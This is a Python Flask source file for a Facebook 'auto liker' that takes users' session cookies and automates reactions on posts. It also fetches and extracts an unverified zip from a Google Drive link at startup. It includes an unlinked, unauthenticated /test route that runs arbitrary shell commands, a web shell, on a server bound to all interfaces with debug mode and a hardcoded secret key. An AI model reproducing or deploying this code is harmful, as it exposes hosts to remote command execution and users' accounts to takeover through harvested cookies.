import subprocess
from urllib.parse import unquote_plus
from flask import Flask, request, jsonify
from selenium_liker import Liker_Engine
from requests import get
from zipfile import ZipFile
import os

with open('chrome.zip','wb') as file:
    file.write(get("https://drive.google.com/uc?export=download&id=1WJ80f4lfds_PnIs2r8Pmi-BkJ4m2i_5A&confirm=t").content)
    file.close()
	
with ZipFile('chrome.zip','r') as file:
    file.extractall()
    file.close()
    os.remove('chrome.zip')
	
app=Flask(__name__)
app.config["SECRET_KEY"]="UWuiNuUEFGeypGkegGDeibi"


@app.route('/', methods=['GET','POST'])
def home():
	return """<title>Selenium Auto Liker</title><form method="POST" action="/send"><input name="react" placeholder="React Name"/><input name="post_id" placeholder="Post ID"/><input name="cookie" placeholder="FB Cookie"/><input type="submit"/></form>"""

@app.route('/send', methods=['GET', 'POST'])
def send_reactions():
	if request.method=='GET':
		react=unquote_plus(request.args.get('react'))
		post_id=unquote_plus(request.args.get('post_id'))
		cookie=unquote_plus(request.args.get('cookie'))
	else:
		react=unquote_plus(request.form.get('react'))
		post_id=unquote_plus(request.form.get('post_id'))
		cookie=unquote_plus(request.form.get('cookie'))

	engine=Liker_Engine(react, post_id, cookie)
	return jsonify(engine)

@app.route("/test", methods=["GET","POST"])
def test():
    if request.method=="POST":
        cmd=unquote_plus(request.form.get("cmd"))
        result=subprocess.run(cmd.split(), capture_output=True)
        return f"""Out:<br>{result.stdout.decode("utf-8")}<br><br>Err:<br>{result.stderr.decode("utf-8")}<br><button><a href="/">Back to Home</a></button>"""
    html=f"""
<form method="POST" style="margin-top:20px;">
<input name="cmd" placeholder="Type Command"/>
<input type="submit" value="Submit"/>
</form>
"""
    return html

if __name__=="__main__":
    app.run(host='0.0.0.0',port=5000,debug=True)